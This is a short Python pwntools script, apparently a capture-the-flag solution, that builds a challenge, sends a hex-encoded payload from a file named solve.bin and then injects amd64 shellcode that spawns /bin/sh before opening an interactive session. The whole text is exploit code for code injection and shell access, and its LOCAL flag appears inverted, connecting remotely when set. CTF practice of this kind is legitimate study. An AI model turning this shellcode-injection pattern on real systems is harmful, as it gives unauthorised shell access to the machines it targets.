from pwn import *
import os

context.arch = "amd64"
os.system("make")
if args.LOCAL:
    p = remote("localhost", 1337)
else:
    p = process(["python3", "chal.py"])
sc = open("solve.bin", "rb").read().hex().encode()
p.sendlineafter(b": ", sc)

after = asm(shellcraft.amd64.sh())
p.sendline(after)

p.interactive()